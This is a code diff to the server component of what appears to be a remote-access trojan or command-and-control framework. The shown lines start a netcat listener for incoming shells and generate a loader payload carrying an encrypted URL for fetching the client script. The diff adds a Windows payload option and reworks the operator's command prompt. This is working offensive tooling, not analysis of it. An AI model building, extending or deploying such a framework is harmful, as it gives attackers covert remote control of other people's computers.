@@ -225,15 +225,16 @@ class server():
         os.system('nc -lvnp 5002')
 
         
-    def _payload(self,):
+    def _payload(self, payload_type=""):
         
         payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
         url = self.url + "/client.py"
         helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
-          
-
         
-        helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')
+        if payload_type == "win":
+            helpers.windows_payload()
+        else:
+            helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')
 
     
     def _shell(self):
@@ -297,12 +298,17 @@ class server():
         self.threads.append(self.get_client_connection())
         while True and not globals()['close']:
             cmd_string = input(getattr(colorama.Fore, 'GREEN') + "->" + colorama.Style.RESET_ALL)
-            cmd, x, action = cmd_string.partition(' ')
+            parts = cmd_string.split()
+            if not parts:
+                continue
+            cmd = parts[0]
+            action = " ".join(parts[1:])
+
             if cmd in self.commands:
                 method = self.commands[cmd]['method']
                 if callable(method):
                     try:
-                        out = method(action) if len(action) else method()
+                        out = method(action) if action else method()
                         if out == None:
                             out = ''
                         c = 'BLUE'
